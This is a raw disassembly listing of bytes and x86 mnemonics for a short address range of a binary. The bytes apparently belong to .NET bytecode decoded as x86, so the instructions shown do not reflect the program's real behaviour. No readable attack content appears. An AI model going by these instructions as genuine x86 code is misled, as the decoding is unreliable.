  4030e2:	66 00 00             	data16 add %al,(%eax)
  4030e5:	0a 06                	or     (%esi),%al
  4030e7:	7b 28                	jnp    0x403111
  4030e9:	00 00                	add    %al,(%eax)
  4030eb:	04 17                	add    $0x17,%al
  4030ed:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  4030f4:	72 ff                	jb     0x4030f5
  4030f6:	01 00                	add    %eax,(%eax)
  4030f8:	70 16                	jo     0x403110
  4030fa:	8d 03                	lea    (%ebx),%eax
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	01 14 14             	add    %edx,(%esp,%edx,1)
  403101:	14 28                	adc    $0x28,%al
  403103:	72 00                	jb     0x403105
  403105:	00 0a                	add    %cl,(%edx)
  403107:	28 66 00             	sub    %ah,0x0(%esi)
  40310a:	00 0a                	add    %cl,(%edx)
  40310c:	7e 19                	jle    0x403127
  40310e:	00 00                	add    %al,(%eax)
  403110:	04 28                	add    $0x28,%al
  403112:	66 00 00             	data16 add %al,(%eax)
  403115:	0a 28                	or     (%eax),%ch
  403117:	38 00                	cmp    %al,(%eax)
  403119:	00 06                	add    %al,(%esi)
  40311b:	28 66 00             	sub    %ah,0x0(%esi)
  40311e:	00 0a                	add    %cl,(%edx)
  403120:	28 3b                	sub    %bh,(%ebx)
  403122:	00 00                	add    %al,(%eax)
  403124:	0a 28                	or     (%eax),%ch
  403126:	1c 00                	sbb    $0x0,%al
  403128:	00 06                	add    %al,(%esi)
  40312a:	38 79 2c             	cmp    %bh,0x2c(%ecx)
  40312d:	00 00                	add    %al,(%eax)
  40312f:	11 23                	adc    %esp,(%ebx)
  403131:	72 09                	jb     0x40313c
  403133:	02 00                	add    (%eax),%al
  403135:	70 16                	jo     0x40314d
  403137:	28 69 00             	sub    %ch,0x0(%ecx)
  40313a:	00 0a                	add    %cl,(%edx)
  40313c:	16                   	push   %ss
  40313d:	33 13                	xor    (%ebx),%edx
  40313f:	06                   	push   %es
  403140:	7b 28                	jnp    0x40316a
  403142:	00 00                	add    %al,(%eax)
  403144:	04 17                	add    $0x17,%al
  403146:	9a 28 7c 00 00 0a 26 	lcall  $0x260a,$0x7c28
  40314d:	38 56 2c             	cmp    %dl,0x2c(%esi)
  403150:	00 00                	add    %al,(%eax)
  403152:	11 23                	adc    %esp,(%ebx)
  403154:	72 11                	jb     0x403167
  403156:	02 00                	add    (%eax),%al
  403158:	70 16                	jo     0x403170
  40315a:	28 69 00             	sub    %ch,0x0(%ecx)
  40315d:	00 0a                	add    %cl,(%edx)
  40315f:	16                   	push   %ss
  403160:	40                   	inc    %eax
  403161:	a8 00                	test   $0x0,%al
  403163:	00 00                	add    %al,(%eax)
  403165:	72 23                	jb     0x40318a
  403167:	02 00                	add    (%eax),%al
  403169:	70 72                	jo     0x4031dd
  40316b:	5d                   	pop    %ebp
  40316c:	02 00                	add    (%eax),%al
  40316e:	70 28                	jo     0x403198
  403170:	7d 00                	jge    0x403172
  403172:	00 0a                	add    %cl,(%edx)
  403174:	28 11                	sub    %dl,(%ecx)
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 13                	or     (%ebx),%dl
  40317a:	06                   	push   %es
  40317b:	11 06                	adc    %eax,(%esi)
  40317d:	14 72                	adc    $0x72,%al
  40317f:	5f                   	pop    %edi
  403180:	02 00                	add    (%eax),%al
  403182:	70 17                	jo     0x40319b
  403184:	8d 03                	lea    (%ebx),%eax
  403186:	00 00                	add    %al,(%eax)
  403188:	01 13                	add    %edx,(%ebx)
  40318a:	25 11 25 16 06       	and    $0x6162511,%eax
  40318f:	7b 28                	jnp    0x4031b9
  403191:	00 00                	add    %al,(%eax)
  403193:	04 13                	add    $0x13,%al
  403195:	29 11                	sub    %edx,(%ecx)
  403197:	29 17                	sub    %edx,(%edi)
  403199:	13 2a                	adc    (%edx),%ebp
  40319b:	11 2a                	adc    %ebp,(%edx)
  40319d:	9a a2 11 25 13 24 11 	lcall  $0x1124,$0x132511a2
  4031a4:	24 14                	and    $0x14,%al
  4031a6:	14 17                	adc    $0x17,%al
  4031a8:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  4031ab:	00 01                	add    %al,(%ecx)
  4031ad:	13 26                	adc    (%esi),%esp
  4031af:	11 26                	adc    %esp,(%esi)
  4031b1:	16                   	push   %ss
  4031b2:	17                   	pop    %ss
  4031b3:	9c                   	pushf
  4031b4:	11 26                	adc    %esp,(%esi)
  4031b6:	17                   	pop    %ss
  4031b7:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4031bb:	0a 26                	or     (%esi),%ah
  4031bd:	11 26                	adc    %esp,(%esi)
  4031bf:	16                   	push   %ss
  4031c0:	90                   	nop
  4031c1:	2c 22                	sub    $0x22,%al
  4031c3:	11 29                	adc    %ebp,(%ecx)
  4031c5:	11 2a                	adc    %ebp,(%edx)
  4031c7:	11 24 16             	adc    %esp,(%esi,%edx,1)
  4031ca:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  4031d1:	28 00                	sub    %al,(%eax)
  4031d3:	00 01                	add    %al,(%ecx)
  4031d5:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4031d8:	00 0a                	add    %cl,(%edx)
  4031da:	28 6d 00             	sub    %ch,0x0(%ebp)
  4031dd:	00 0a                	add    %cl,(%edx)
  4031df:	74 28                	je     0x403209
  4031e1:	00 00                	add    %al,(%eax)
  4031e3:	01 a2 11 06 14 72    	add    %esp,0x72140611(%edx)
  4031e9:	71 02                	jno    0x4031ed
  4031eb:	00 70 17             	add    %dh,0x17(%eax)
  4031ee:	8d 03                	lea    (%ebx),%eax
  4031f0:	00 00                	add    %al,(%eax)
  4031f2:	01 13                	add    %edx,(%ebx)
  4031f4:	25 11 25 16 16       	and    $0x16162511,%eax
  4031f9:	8c 5a 00             	mov    %ds,0x0(%edx)
  4031fc:	00 01                	add    %al,(%ecx)
  4031fe:	a2 11 25 14 14       	mov    %al,0x14142511
  403203:	28 7e 00             	sub    %bh,0x0(%esi)
  403206:	00 0a                	add    %cl,(%edx)
  403208:	38 9b 2b 00 00 11    	cmp    %bl,0x1100002b(%ebx)
  40320e:	23 72 81             	and    -0x7f(%edx),%esi
  403211:	02 00                	add    (%eax),%al
  403213:	70 16                	jo     0x40322b
  403215:	28 69 00             	sub    %ch,0x0(%ecx)
  403218:	00 0a                	add    %cl,(%edx)
  40321a:	16                   	push   %ss
  40321b:	33 16                	xor    (%esi),%edx
  40321d:	06                   	push   %es
  40321e:	7b 28                	jnp    0x403248
  403220:	00 00                	add    %al,(%eax)
  403222:	04 17                	add    $0x17,%al
  403224:	9a 16 16 15 28 7f 00 	lcall  $0x7f,$0x28151616
  40322b:	00 0a                	add    %cl,(%edx)
  40322d:	26 38 75 2b          	cmp    %dh,%es:0x2b(%ebp)
  403231:	00 00                	add    %al,(%eax)
  403233:	11 23                	adc    %esp,(%ebx)
  403235:	72 93                	jb     0x4031ca
  403237:	02 00                	add    (%eax),%al
  403239:	70 16                	jo     0x403251
  40323b:	28 69 00             	sub    %ch,0x0(%ecx)
  40323e:	00 0a                	add    %cl,(%edx)
  403240:	16                   	push   %ss
  403241:	40                   	inc    %eax
  403242:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403243:	00 00                	add    %al,(%eax)
  403245:	00 72 a1             	add    %dh,-0x5f(%edx)
  403248:	02 00                	add    (%eax),%al
  40324a:	70 72                	jo     0x4032be
  40324c:	5d                   	pop    %ebp
  40324d:	02 00                	add    (%eax),%al
  40324f:	70 28                	jo     0x403279
  403251:	7d 00                	jge    0x403253
  403253:	00 0a                	add    %cl,(%edx)
  403255:	14 72                	adc    $0x72,%al
  403257:	bd 02 00 70 19       	mov    $0x19700002,%ebp
  40325c:	8d 03                	lea    (%ebx),%eax
  40325e:	00 00                	add    %al,(%eax)
  403260:	01 13                	add    %edx,(%ebx)
  403262:	25 11 25 16 06       	and    $0x6162511,%eax
  403267:	7b 28                	jnp    0x403291
  403269:	00 00                	add    %al,(%eax)
  40326b:	04 13                	add    $0x13,%al
  40326d:	29 11                	sub    %edx,(%ecx)
  40326f:	29 17                	sub    %edx,(%edi)
  403271:	13 2a                	adc    (%edx),%ebp
  403273:	11 2a                	adc    %ebp,(%edx)
  403275:	9a a2 11 25 17 06 7b 	lcall  $0x7b06,$0x172511a2
  40327c:	28 00                	sub    %al,(%eax)
  40327e:	00 04 18             	add    %al,(%eax,%ebx,1)
  403281:	9a 28 80 00 00 0a 8c 	lcall  $0x8c0a,$0x8028
  403288:	5a                   	pop    %edx
  403289:	00 00                	add    %al,(%eax)
  40328b:	01 a2 11 25 18 72    	add    %esp,0x72182511(%edx)
  403291:	cf                   	iret
  403292:	02 00                	add    (%eax),%al
  403294:	70 a2                	jo     0x403238
  403296:	11 25 13 24 11 24    	adc    %esp,0x24112413
  40329c:	14 14                	adc    $0x14,%al
  40329e:	19 8d 3c 00 00 01    	sbb    %ecx,0x100003c(%ebp)
  4032a4:	13 26                	adc    (%esi),%esp
  4032a6:	11 26                	adc    %esp,(%esi)
  4032a8:	16                   	push   %ss
  4032a9:	17                   	pop    %ss
  4032aa:	9c                   	pushf
  4032ab:	11 26                	adc    %esp,(%esi)
  4032ad:	17                   	pop    %ss
  4032ae:	16                   	push   %ss
  4032af:	9c                   	pushf
  4032b0:	11 26                	adc    %esp,(%esi)
  4032b2:	18 16                	sbb    %dl,(%esi)
  4032b4:	9c                   	pushf
  4032b5:	11 26                	adc    %esp,(%esi)
  4032b7:	17                   	pop    %ss
  4032b8:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4032bc:	0a 26                	or     (%esi),%ah
  4032be:	11 26                	adc    %esp,(%esi)
  4032c0:	16                   	push   %ss
  4032c1:	90                   	nop
  4032c2:	2c 22                	sub    $0x22,%al
  4032c4:	11 29                	adc    %ebp,(%ecx)
  4032c6:	11 2a                	adc    %ebp,(%edx)
  4032c8:	11 24 16             	adc    %esp,(%esi,%edx,1)
  4032cb:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  4032d2:	28 00                	sub    %al,(%eax)
  4032d4:	00 01                	add    %al,(%ecx)
  4032d6:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4032d9:	00 0a                	add    %cl,(%edx)
  4032db:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032de:	00 0a                	add    %cl,(%edx)
  4032e0:	74 28                	je     0x40330a
  4032e2:	00 00                	add    %al,(%eax)
  4032e4:	01 a2 38 bd 2a 00    	add    %esp,0x2abd38(%edx)
  4032ea:	00 11                	add    %dl,(%ecx)
  4032ec:	23 72 e3             	and    -0x1d(%edx),%esi
  4032ef:	02 00                	add    (%eax),%al
  4032f1:	70 16                	jo     0x403309
  4032f3:	28 69 00             	sub    %ch,0x0(%ecx)
  4032f6:	00 0a                	add    %cl,(%edx)
  4032f8:	16                   	push   %ss
  4032f9:	33 28                	xor    (%eax),%ebp
  4032fb:	06                   	push   %es
  4032fc:	7b 28                	jnp    0x403326
  4032fe:	00 00                	add    %al,(%eax)
  403300:	04 17                	add    $0x17,%al
  403302:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  403309:	72 eb                	jb     0x4032f6
  40330b:	02 00                	add    (%eax),%al
  40330d:	70 16                	jo     0x403325
  40330f:	8d 03                	lea    (%ebx),%eax
  403311:	00 00                	add    %al,(%eax)
  403313:	01 14 14             	add    %edx,(%esp,%edx,1)
  403316:	14 17                	adc    $0x17,%al
  403318:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40331c:	0a 26                	or     (%esi),%ah
  40331e:	38 85 2a 00 00 11    	cmp    %al,0x1100002a(%ebp)
  403324:	23 72 05             	and    0x5(%edx),%esi
  403327:	03 00                	add    (%eax),%eax
  403329:	70 16                	jo     0x403341
  40332b:	28 69 00             	sub    %ch,0x0(%ecx)
  40332e:	00 0a                	add    %cl,(%edx)
  403330:	16                   	push   %ss
  403331:	33 28                	xor    (%eax),%ebp
  403333:	06                   	push   %es
  403334:	7b 28                	jnp    0x40335e
  403336:	00 00                	add    %al,(%eax)
  403338:	04 17                	add    $0x17,%al
  40333a:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  403341:	72 11                	jb     0x403354
  403343:	03 00                	add    (%eax),%eax
  403345:	70 16                	jo     0x40335d
  403347:	8d 03                	lea    (%ebx),%eax
  403349:	00 00                	add    %al,(%eax)
  40334b:	01 14 14             	add    %edx,(%esp,%edx,1)
  40334e:	14 17                	adc    $0x17,%al
  403350:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  403354:	0a 26                	or     (%esi),%ah
  403356:	38 4d 2a             	cmp    %cl,0x2a(%ebp)
  403359:	00 00                	add    %al,(%eax)
  40335b:	11 23                	adc    %esp,(%ebx)
  40335d:	72 19                	jb     0x403378
  40335f:	03 00                	add    (%eax),%eax
  403361:	70 16                	jo     0x403379
  403363:	28 69 00             	sub    %ch,0x0(%ecx)
  403366:	00 0a                	add    %cl,(%edx)
  403368:	16                   	push   %ss
  403369:	40                   	inc    %eax
  40336a:	bb 00 00 00 06       	mov    $0x6000000,%ebx
  40336f:	7b 28                	jnp    0x403399
  403371:	00 00                	add    %al,(%eax)
  403373:	04 17                	add    $0x17,%al
  403375:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  40337c:	72 27                	jb     0x4033a5
  40337e:	03 00                	add    (%eax),%eax
  403380:	70 18                	jo     0x40339a
  403382:	8d 03                	lea    (%ebx),%eax
  403384:	00 00                	add    %al,(%eax)
  403386:	01 13                	add    %edx,(%ebx)
  403388:	25 11 25 16 06       	and    $0x6162511,%eax
  40338d:	7b 28                	jnp    0x4033b7
  40338f:	00 00                	add    %al,(%eax)
  403391:	04 13                	add    $0x13,%al
  403393:	29 11                	sub    %edx,(%ecx)
  403395:	29 18                	sub    %ebx,(%eax)
  403397:	13 2a                	adc    (%edx),%ebp
  403399:	11 2a                	adc    %ebp,(%edx)
  40339b:	9a a2 11 25 17 06 7b 	lcall  $0x7b06,$0x172511a2
  4033a2:	28 00                	sub    %al,(%eax)
  4033a4:	00 04 13             	add    %al,(%ebx,%edx,1)
  4033a7:	27                   	daa
  4033a8:	11 27                	adc    %esp,(%edi)
  4033aa:	19 13                	sbb    %edx,(%ebx)
  4033ac:	28 11                	sub    %dl,(%ecx)
  4033ae:	28 9a a2 11 25 13    	sub    %bl,0x132511a2(%edx)
  4033b4:	24 11                	and    $0x11,%al
  4033b6:	24 14                	and    $0x14,%al
  4033b8:	14 18                	adc    $0x18,%al
  4033ba:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  4033bd:	00 01                	add    %al,(%ecx)
  4033bf:	13 26                	adc    (%esi),%esp
  4033c1:	11 26                	adc    %esp,(%esi)
  4033c3:	16                   	push   %ss
  4033c4:	17                   	pop    %ss
  4033c5:	9c                   	pushf
  4033c6:	11 26                	adc    %esp,(%esi)
  4033c8:	17                   	pop    %ss
  4033c9:	17                   	pop    %ss
  4033ca:	9c                   	pushf
  4033cb:	11 26                	adc    %esp,(%esi)
  4033cd:	17                   	pop    %ss
  4033ce:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4033d2:	0a 26                	or     (%esi),%ah
  4033d4:	11 26                	adc    %esp,(%esi)
  4033d6:	16                   	push   %ss
  4033d7:	90                   	nop
  4033d8:	2c 22                	sub    $0x22,%al
  4033da:	11 29                	adc    %ebp,(%ecx)
  4033dc:	11 2a                	adc    %ebp,(%edx)
  4033de:	11 24 16             	adc    %esp,(%esi,%edx,1)
  4033e1:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  4033e8:	28 00                	sub    %al,(%eax)
  4033ea:	00 01                	add    %al,(%ecx)
  4033ec:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4033ef:	00 0a                	add    %cl,(%edx)
  4033f1:	28 6d 00             	sub    %ch,0x0(%ebp)
  4033f4:	00 0a                	add    %cl,(%edx)
  4033f6:	74 28                	je     0x403420
  4033f8:	00 00                	add    %al,(%eax)
  4033fa:	01 a2 11 26 17 90    	add    %esp,-0x6fe8d9ef(%edx)
  403400:	2c 22                	sub    $0x22,%al
  403402:	11 27                	adc    %esp,(%edi)
  403404:	11 28                	adc    %ebp,(%eax)
  403406:	11 24 17             	adc    %esp,(%edi,%edx,1)
  403409:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  403410:	28 00                	sub    %al,(%eax)
  403412:	00 01                	add    %al,(%ecx)
  403414:	28 14 00             	sub    %dl,(%eax,%eax,1)
  403417:	00 0a                	add    %cl,(%edx)
  403419:	28 6d 00             	sub    %ch,0x0(%ebp)
  40341c:	00 0a                	add    %cl,(%edx)
  40341e:	74 28                	je     0x403448
  403420:	00 00                	add    %al,(%eax)
  403422:	01 a2 38 7f 29 00    	add    %esp,0x297f38(%edx)
  403428:	00 11                	add    %dl,(%ecx)
  40342a:	23 72 2f             	and    0x2f(%edx),%esi
  40342d:	03 00                	add    (%eax),%eax
  40342f:	70 16                	jo     0x403447
  403431:	28 69 00             	sub    %ch,0x0(%ecx)
  403434:	00 0a                	add    %cl,(%edx)
  403436:	16                   	push   %ss
  403437:	33 5f 7e             	xor    0x7e(%edi),%ebx
  40343a:	27                   	daa
  40343b:	00 00                	add    %al,(%eax)
  40343d:	04 6f                	add    $0x6f,%al
  40343f:	81 00 00 0a de 0f    	addl   $0xfde0a00,(%eax)
  403445:	25 28 29 00 00       	and    $0x2928,%eax
  40344a:	0a 13                	or     (%ebx),%dl
  40344c:	07                   	pop    %es
  40344d:	28 2a                	sub    %ch,(%edx)
  40344f:	00 00                	add    %al,(%eax)
  403451:	0a de                	or     %dh,%bl
  403453:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403456:	06                   	push   %es
  403457:	33 00                	xor    (%eax),%eax
  403459:	00 06                	add    %al,(%esi)
  40345b:	73 2b                	jae    0x403488
  40345d:	00 00                	add    %al,(%eax)
  40345f:	0a 73 2c             	or     0x2c(%ebx),%dh
  403462:	00 00                	add    %al,(%eax)
  403464:	0a 80 27 00 00 04    	or     0x4000027(%eax),%al
  40346a:	06                   	push   %es
  40346b:	7b 28                	jnp    0x403495
  40346d:	00 00                	add    %al,(%eax)
  40346f:	04 17                	add    $0x17,%al
  403471:	9a 28 47 00 00 06 80 	lcall  $0x8006,$0x4728
  403478:	25 00 00 04 06       	and    $0x6040000,%eax
  40347d:	7b 28                	jnp    0x4034a7
  40347f:	00 00                	add    %al,(%eax)
  403481:	04 18                	add    $0x18,%al
  403483:	9a 80 26 00 00 04 7e 	lcall  $0x7e04,$0x2680
  40348a:	27                   	daa
  40348b:	00 00                	add    %al,(%eax)
  40348d:	04 6f                	add    $0x6f,%al
  40348f:	2d 00 00 0a 38       	sub    $0x380a0000,%eax
  403494:	10 29                	adc    %ch,(%ecx)
  403496:	00 00                	add    %al,(%eax)
  403498:	11 23                	adc    %esp,(%ebx)
  40349a:	72 3b                	jb     0x4034d7
  40349c:	03 00                	add    (%eax),%eax
  40349e:	70 16                	jo     0x4034b6
  4034a0:	28 69 00             	sub    %ch,0x0(%ecx)
  4034a3:	00 0a                	add    %cl,(%edx)
  4034a5:	16                   	push   %ss
  4034a6:	33 20                	xor    (%eax),%esp
  4034a8:	7e 27                	jle    0x4034d1
  4034aa:	00 00                	add    %al,(%eax)
  4034ac:	04 6f                	add    $0x6f,%al
  4034ae:	81 00 00 0a de 0f    	addl   $0xfde0a00,(%eax)
  4034b4:	25 28 29 00 00       	and    $0x2928,%eax
  4034b9:	0a 13                	or     (%ebx),%dl
  4034bb:	08 28                	or     %ch,(%eax)
  4034bd:	2a 00                	sub    (%eax),%al
  4034bf:	00 0a                	add    %cl,(%edx)
  4034c1:	de 00                	fiadds (%eax)
  4034c3:	38 e0                	cmp    %ah,%al
  4034c5:	28 00                	sub    %al,(%eax)
  4034c7:	00 11                	add    %dl,(%ecx)
  4034c9:	23 72 47             	and    0x47(%edx),%esi
  4034cc:	03 00                	add    (%eax),%eax
  4034ce:	70 16                	jo     0x4034e6
  4034d0:	28 69 00             	sub    %ch,0x0(%ecx)
  4034d3:	00 0a                	add    %cl,(%edx)
  4034d5:	16                   	push   %ss
  4034d6:	40                   	inc    %eax
  4034d7:	bb 00 00 00 06       	mov    $0x6000000,%ebx
  4034dc:	7b 28                	jnp    0x403506
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	04 17                	add    $0x17,%al
  4034e2:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  4034e9:	72 57                	jb     0x403542
  4034eb:	03 00                	add    (%eax),%eax
  4034ed:	70 18                	jo     0x403507
  4034ef:	8d 03                	lea    (%ebx),%eax
  4034f1:	00 00                	add    %al,(%eax)
  4034f3:	01 13                	add    %edx,(%ebx)
  4034f5:	25 11 25 16 06       	and    $0x6162511,%eax
  4034fa:	7b 28                	jnp    0x403524
  4034fc:	00 00                	add    %al,(%eax)
  4034fe:	04 13                	add    $0x13,%al
  403500:	29 11                	sub    %edx,(%ecx)
  403502:	29 18                	sub    %ebx,(%eax)
  403504:	13 2a                	adc    (%edx),%ebp
  403506:	11 2a                	adc    %ebp,(%edx)
  403508:	9a a2 11 25 17 06 7b 	lcall  $0x7b06,$0x172511a2
  40350f:	28 00                	sub    %al,(%eax)
  403511:	00 04 13             	add    %al,(%ebx,%edx,1)
  403514:	27                   	daa
  403515:	11 27                	adc    %esp,(%edi)
  403517:	19 13                	sbb    %edx,(%ebx)
  403519:	28 11                	sub    %dl,(%ecx)
  40351b:	28 9a a2 11 25 13    	sub    %bl,0x132511a2(%edx)
  403521:	24 11                	and    $0x11,%al
  403523:	24 14                	and    $0x14,%al
  403525:	14 18                	adc    $0x18,%al
  403527:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  40352a:	00 01                	add    %al,(%ecx)
  40352c:	13 26                	adc    (%esi),%esp
  40352e:	11 26                	adc    %esp,(%esi)
  403530:	16                   	push   %ss
  403531:	17                   	pop    %ss
  403532:	9c                   	pushf
  403533:	11 26                	adc    %esp,(%esi)
  403535:	17                   	pop    %ss
  403536:	17                   	pop    %ss
  403537:	9c                   	pushf
  403538:	11 26                	adc    %esp,(%esi)
  40353a:	17                   	pop    %ss
  40353b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40353f:	0a 26                	or     (%esi),%ah
  403541:	11 26                	adc    %esp,(%esi)
  403543:	16                   	push   %ss
  403544:	90                   	nop
  403545:	2c 22                	sub    $0x22,%al
  403547:	11 29                	adc    %ebp,(%ecx)
  403549:	11 2a                	adc    %ebp,(%edx)
  40354b:	11 24 16             	adc    %esp,(%esi,%edx,1)
  40354e:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  403555:	28 00                	sub    %al,(%eax)
  403557:	00 01                	add    %al,(%ecx)
  403559:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40355c:	00 0a                	add    %cl,(%edx)
  40355e:	28 6d 00             	sub    %ch,0x0(%ebp)
  403561:	00 0a                	add    %cl,(%edx)
  403563:	74 28                	je     0x40358d
  403565:	00 00                	add    %al,(%eax)
  403567:	01 a2 11 26 17 90    	add    %esp,-0x6fe8d9ef(%edx)
  40356d:	2c 22                	sub    $0x22,%al
  40356f:	11 27                	adc    %esp,(%edi)
  403571:	11 28                	adc    %ebp,(%eax)
  403573:	11 24 17             	adc    %esp,(%edi,%edx,1)
  403576:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  40357d:	28 00                	sub    %al,(%eax)
  40357f:	00 01                	add    %al,(%ecx)
  403581:	28 14 00             	sub    %dl,(%eax,%eax,1)
  403584:	00 0a                	add    %cl,(%edx)
  403586:	28 6d 00             	sub    %ch,0x0(%ebp)
  403589:	00 0a                	add    %cl,(%edx)
  40358b:	74 28                	je     0x4035b5
  40358d:	00 00                	add    %al,(%eax)
  40358f:	01 a2 38 12 28 00    	add    %esp,0x281238(%edx)
  403595:	00 11                	add    %dl,(%ecx)
  403597:	23 72 67             	and    0x67(%edx),%esi
  40359a:	03 00                	add    (%eax),%eax
  40359c:	70 16                	jo     0x4035b4
  40359e:	28 69 00             	sub    %ch,0x0(%ecx)
  4035a1:	00 0a                	add    %cl,(%edx)
  4035a3:	16                   	push   %ss
  4035a4:	40                   	inc    %eax
  4035a5:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4035a6:	00 00                	add    %al,(%eax)
  4035a8:	00 06                	add    %al,(%esi)
  4035aa:	7b 28                	jnp    0x4035d4
  4035ac:	00 00                	add    %al,(%eax)
  4035ae:	04 18                	add    $0x18,%al
  4035b0:	9a 28 82 00 00 0a 39 	lcall  $0x390a,$0x8228
  4035b7:	90                   	nop
  4035b8:	00 00                	add    %al,(%eax)
  4035ba:	00 06                	add    %al,(%esi)
  4035bc:	7b 28                	jnp    0x4035e6
  4035be:	00 00                	add    %al,(%eax)
  4035c0:	04 17                	add    $0x17,%al
  4035c2:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  4035c9:	72 6d                	jb     0x403638
  4035cb:	03 00                	add    (%eax),%eax
  4035cd:	70 18                	jo     0x4035e7
  4035cf:	8d 03                	lea    (%ebx),%eax
  4035d1:	00 00                	add    %al,(%eax)
  4035d3:	01 13                	add    %edx,(%ebx)
  4035d5:	25 11 25 16 06       	and    $0x6162511,%eax
  4035da:	7b 28                	jnp    0x403604
  4035dc:	00 00                	add    %al,(%eax)
  4035de:	04 13                	add    $0x13,%al
  4035e0:	29 11                	sub    %edx,(%ecx)
  4035e2:	29 18                	sub    %ebx,(%eax)
  4035e4:	13 2a                	adc    (%edx),%ebp
  4035e6:	11 2a                	adc    %ebp,(%edx)
  4035e8:	9a a2 11 25 17 06 7b 	lcall  $0x7b06,$0x172511a2
  4035ef:	28 00                	sub    %al,(%eax)
  4035f1:	00 04 19             	add    %al,(%ecx,%ebx,1)
  4035f4:	9a 28 3a 00 00 06 28 	lcall  $0x2806,$0x3a28
  4035fb:	11 00                	adc    %eax,(%eax)
  4035fd:	00 0a                	add    %cl,(%edx)
  4035ff:	a2 11 25 13 24       	mov    %al,0x24132511
  403604:	11 24 14             	adc    %esp,(%esp,%edx,1)
  403607:	14 18                	adc    $0x18,%al
  403609:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  40360c:	00 01                	add    %al,(%ecx)
  40360e:	13 26                	adc    (%esi),%esp
  403610:	11 26                	adc    %esp,(%esi)
  403612:	16                   	push   %ss
  403613:	17                   	pop    %ss
  403614:	9c                   	pushf
  403615:	11 26                	adc    %esp,(%esi)
  403617:	17                   	pop    %ss
  403618:	16                   	push   %ss
  403619:	9c                   	pushf
  40361a:	11 26                	adc    %esp,(%esi)
  40361c:	17                   	pop    %ss
  40361d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  403621:	0a 26                	or     (%esi),%ah
  403623:	11 26                	adc    %esp,(%esi)
  403625:	16                   	push   %ss
  403626:	90                   	nop
  403627:	2c 22                	sub    $0x22,%al
  403629:	11 29                	adc    %ebp,(%ecx)
  40362b:	11 2a                	adc    %ebp,(%edx)
  40362d:	11 24 16             	adc    %esp,(%esi,%edx,1)
  403630:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  403637:	28 00                	sub    %al,(%eax)
  403639:	00 01                	add    %al,(%ecx)
  40363b:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40363e:	00 0a                	add    %cl,(%edx)
  403640:	28 6d 00             	sub    %ch,0x0(%ebp)
  403643:	00 0a                	add    %cl,(%edx)
  403645:	74 28                	je     0x40366f
  403647:	00 00                	add    %al,(%eax)
  403649:	01 a2 38 58 27 00    	add    %esp,0x275838(%edx)
  40364f:	00 11                	add    %dl,(%ecx)
  403651:	23 72 7b             	and    0x7b(%edx),%esi
  403654:	03 00                	add    (%eax),%eax
  403656:	70 16                	jo     0x40366e
  403658:	28 69 00             	sub    %ch,0x0(%ecx)
  40365b:	00 0a                	add    %cl,(%edx)
  40365d:	16                   	push   %ss
  40365e:	33 7e 7e             	xor    0x7e(%esi),%edi
  403661:	0d 00 00 04 2c       	or     $0x2c040000,%eax
  403666:	02 2b                	add    (%ebx),%ch
  403668:	70 06                	jo     0x403670
  40366a:	7b 28                	jnp    0x403694
  40366c:	00 00                	add    %al,(%eax)
  40366e:	04 17                	add    $0x17,%al
  403670:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  403677:	72 8d                	jb     0x403606
  403679:	03 00                	add    (%eax),%eax
  40367b:	70 17                	jo     0x403694
  40367d:	8d 03                	lea    (%ebx),%eax
  40367f:	00 00                	add    %al,(%eax)
  403681:	01 13                	add    %edx,(%ebx)
  403683:	25 11 25 16 7e       	and    $0x7e162511,%eax
  403688:	0a 00                	or     (%eax),%al
  40368a:	00 04 a2             	add    %al,(%edx,%eiz,4)
  40368d:	11 25 13 24 11 24    	adc    %esp,0x24112413
  403693:	14 14                	adc    $0x14,%al
  403695:	17                   	pop    %ss
  403696:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  403699:	00 01                	add    %al,(%ecx)
  40369b:	13 26                	adc    (%esi),%esp
  40369d:	11 26                	adc    %esp,(%esi)
  40369f:	16                   	push   %ss
  4036a0:	17                   	pop    %ss
  4036a1:	9c                   	pushf
  4036a2:	11 26                	adc    %esp,(%esi)
  4036a4:	17                   	pop    %ss
  4036a5:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4036a9:	0a 26                	or     (%esi),%ah
  4036ab:	11 26                	adc    %esp,(%esi)
  4036ad:	16                   	push   %ss
  4036ae:	90                   	nop
  4036af:	2c 22                	sub    $0x22,%al
  4036b1:	11 24 16             	adc    %esp,(%esi,%edx,1)
